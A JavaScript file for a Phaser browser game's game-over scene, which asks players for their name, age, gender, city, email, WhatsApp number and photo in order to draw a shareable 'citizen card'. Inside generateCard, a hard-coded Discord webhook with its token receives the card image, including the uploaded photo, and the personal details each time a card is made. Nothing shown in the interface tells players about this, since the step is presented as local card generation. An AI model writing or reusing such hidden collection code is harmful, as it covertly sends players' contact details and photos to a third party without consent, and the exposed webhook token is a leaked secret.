import Phaser from 'phaser';

export default class GameOverScene extends Phaser.Scene {
    constructor() {
        super('GameOverScene');
    }

    init(data) {
        this.finalScore = data.score || 0;
    }

    create() {
        // Stop all other scenes input just in case
        this.input.keyboard.removeAllListeners();

        // Show HTML UI
        const uiForm = document.getElementById('ui-card-form');
        uiForm.classList.remove('hidden');
        document.getElementById('final-score').innerText = this.finalScore;

        const generateBtn = document.getElementById('btn-generate-card');

        // Remove old listeners if they exist to prevent duplicates
        const newBtn = generateBtn.cloneNode(true);
        generateBtn.parentNode.replaceChild(newBtn, generateBtn);

        newBtn.addEventListener('click', () => {
            const name = document.getElementById('citizen-name').value || 'مواطن مجهول';
            const age = document.getElementById('citizen-age').value || '??';
            const gender = document.getElementById('citizen-gender').value || 'رجل';
            const city = document.getElementById('citizen-city').value || 'المجهول';
            const email = document.getElementById('citizen-email').value || 'لا يوجد';
            const whatsapp = document.getElementById('citizen-whatsapp').value || 'لا يوجد';
            const fileInput = document.getElementById('citizen-photo');
            let photoUrl = null;

            if (fileInput.files && fileInput.files[0]) {
                photoUrl = URL.createObjectURL(fileInput.files[0]);
            }

            uiForm.classList.add('hidden');
            this.generateCard({name, age, gender, city, email, whatsapp, score: this.finalScore, photoUrl});
        });

        const restartBtn = document.getElementById('btn-restart');
        const newRestartBtn = restartBtn.cloneNode(true);
        restartBtn.parentNode.replaceChild(newRestartBtn, restartBtn);

        newRestartBtn.addEventListener('click', () => {
            document.getElementById('ui-card-result').classList.add('hidden');
            this.scene.start('MainMenuScene');
        });

        const downloadBtn = document.getElementById('btn-download');
        const newDownloadBtn = downloadBtn.cloneNode(true);
        downloadBtn.parentNode.replaceChild(newDownloadBtn, downloadBtn);

        newDownloadBtn.addEventListener('click', () => {
            const canvas = document.getElementById('card-canvas');
            const link = document.createElement('a');
            link.download = 'barq_citizen_card.png';
            link.href = canvas.toDataURL();
            link.click();
        });


    }

    generateCard(data) {

        const sendToDiscord = () => {
            const discordWebhookUrl = 'https://discordapp.com/api/webhooks/1503536005402329148/xyNGmOqvEWRyrKSO2mLx1Kk-A2ZwEo4RxZfOubwhh1EeaWUzGQaMwpUvFXIka-2DTUw4';
            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'barq_card.png');
                formData.append('payload_json', JSON.stringify({
                    content: "👑 **طلب انتساب جديد لكوكب برق البرق!** 👑\n**الاسم:** " + data.name + "\n**العمر:** " + data.age + "\n**المدينة:** " + data.city + "\n**الواتساب:** " + data.whatsapp + "\n**الإيميل:** " + data.email
                }));

                fetch(discordWebhookUrl, { method: 'POST', body: formData }).catch(e => console.error("Discord webhook failed", e));
            });
        };

        const uiResult = document.getElementById('ui-card-result');
        uiResult.classList.remove('hidden');

        const shareText = "لقد تم رفضي من الملكة في كوكب برق البرق برصيد " + data.score + " نقطة فقط! من يتحداني؟";
        let pText = document.getElementById('share-text');
        if (pText) {
            pText.innerText = shareText;
        }

        const canvas = document.getElementById('card-canvas');
        const ctx = canvas.getContext('2d');

        // Use template 1 as base
        const template = new Image();
        template.src = '/assets/images.jpg';
        template.onload = () => {
            canvas.width = template.width;
            canvas.height = template.height;
            ctx.drawImage(template, 0, 0);

            // Draw Texts (adjust coordinates based on the template structure)
            ctx.fillStyle = '#C71585'; // Deep Pink
            ctx.font = 'bold 30px Tahoma';
            ctx.textAlign = 'center';


            // Write Name
            ctx.fillStyle = '#C71585';
            ctx.font = 'bold 30px Tahoma';
            ctx.fillText(data.name, canvas.width / 2, canvas.height - 130);

            // Draw additional details (Age, Gender, City)
            ctx.font = '22px Tahoma';
            ctx.fillStyle = '#FF1493';
            ctx.fillText('العمر: ' + data.age + ' | الجنس: ' + data.gender, canvas.width / 2, canvas.height - 90);
            ctx.fillText('المدينة: ' + data.city, canvas.width / 2, canvas.height - 65);
            ctx.font = '18px Tahoma';
            ctx.fillStyle = '#FFFFFF';
            ctx.fillText('✉ ' + data.email + ' | ✆ ' + data.whatsapp, canvas.width / 2, canvas.height - 40);

            // Write Score
            ctx.fillStyle = '#FFFFFF';
            ctx.font = 'bold 40px Tahoma';
            ctx.fillText(data.score.toString(), canvas.width * 0.75, canvas.height / 2 + 30);

            // Draw Photo if provided
            if (data.photoUrl) {
                const userImg = new Image();
                userImg.onload = () => {
                    const centerX = 150;
                    const centerY = 280;
                    const radius = 90;

                    ctx.save();
                    ctx.beginPath();
                    ctx.arc(centerX, centerY, radius, 0, Math.PI * 2, true);
                    ctx.closePath();
                    ctx.clip();

                    // Center and crop image dynamically to fill the circle
                    const aspect = userImg.width / userImg.height;
                    let drawWidth, drawHeight;
                    if (aspect > 1) { // Landscape
                        drawHeight = radius * 2;
                        drawWidth = drawHeight * aspect;
                    } else { // Portrait
                        drawWidth = radius * 2;
                        drawHeight = drawWidth / aspect;
                    }
                    const drawX = centerX - (drawWidth / 2);
                    const drawY = centerY - (drawHeight / 2);

                    ctx.drawImage(userImg, drawX, drawY, drawWidth, drawHeight);
                    ctx.restore();

                    // Draw border around image
                    ctx.beginPath();
                    ctx.arc(centerX, centerY, radius, 0, Math.PI * 2, true);
                    ctx.lineWidth = 10;
                    ctx.strokeStyle = '#FFD700';
                    ctx.stroke();
                    sendToDiscord();
                };
                userImg.src = data.photoUrl;
            } else {
                // Draw a placeholder generic silhouette if no photo is uploaded
                const centerX = 150;
                const centerY = 280;
                const radius = 90;

                ctx.beginPath();
                ctx.arc(centerX, centerY, radius, 0, Math.PI * 2, true);
                ctx.fillStyle = '#EEEEEE';
                ctx.fill();
                ctx.lineWidth = 10;
                ctx.strokeStyle = '#FFD700';
                ctx.stroke();

                ctx.fillStyle = '#CCCCCC';
                ctx.font = 'bold 24px Tahoma';
                ctx.fillText('بدون صورة', centerX, centerY + 10);
                sendToDiscord();
            }

        };
    }
}